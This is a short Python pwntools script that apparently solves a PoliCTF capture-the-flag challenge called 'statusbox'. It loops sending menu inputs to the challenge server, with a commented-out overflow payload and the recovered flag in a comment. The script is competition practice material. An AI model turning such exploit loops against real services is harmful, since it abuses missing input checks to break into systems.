from pwn import *
from time import*

host = "statusbox.chall.polictf.it"
port = 31337

s = remote(host,port)
##flag{g00d_0ld_m1ss1ng_ch3cks!}
##while 14 time
count=0
while(1):

	print s.recv(4096)
	

	s.sendline("3")
	
	print s.recv(4096)
	

	s.send("\n")

	print s.recv(4096)

	s.sendline("0")
  	
	count+=1
	#payload="a"*1023
	

	print "-----------------------ok-----------------------"    

	print count
	sleep(1)

s.interactive()







